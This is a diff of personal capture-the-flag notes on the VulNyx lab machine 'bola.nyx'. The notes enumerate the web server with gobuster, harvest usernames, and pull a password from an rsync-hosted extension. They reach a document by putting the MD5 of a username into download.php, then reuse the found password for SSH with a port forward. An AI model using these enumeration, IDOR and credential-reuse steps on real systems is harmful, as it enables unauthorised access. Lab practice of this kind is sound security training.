@@ -7,21 +7,6 @@ export IP=192.168.0.24
 
 /etc/hosts --> bola.nyx
 
-# 80
-
-```bash
-gobuster dir -u http://bola.nyx/ -w /home/dani/Documents/lists/content.txt -t 200
-```
-
-http://bola.nyx/.well-known/openid-configuration
-
-usernames
-```
-d4t4s3c
-jackie0x17
-ct0l4
-```
-
 # 873 Rsync
 
 https://github.com/VulNyx/Arsenal/tree/main/rsync-brute
@@ -42,4 +27,45 @@ rsync -avz rsync://bola.nyx/extensions/password_manager.zip .
 cat background.js
 username: "jackie0x17@nyx.com", password: "sbIJ0x9g{C3`"
 ```
+
+# 80
+
+```bash
+gobuster dir -u http://bola.nyx/ -w /home/dani/Documents/lists/content.txt -t 200
+```
+
+http://bola.nyx/.well-known/openid-configuration
+
+usernames
+```
+d4t4s3c
+jackie0x17
+ct0l4
+```
+
+
+```bash
+echo -n "d4t4s3c"| md5sum
+97035ded598faa2ce8ff63f7f9dd3b70
+```
+
+http://bola.nyx/download.php?file_name=97035ded598faa2ce8ff63f7f9dd3b70.pdf
+
+admin:VulNyxtestinglogin123
+
+# 22
+
+```bash
+ssh -L 9000:127.0.0.1:9000 d4t4s3c@bola.nyx
+VulNyxtestinglogin123
+```
+
+# WDSL
+
+
+
+
+
+
+
 
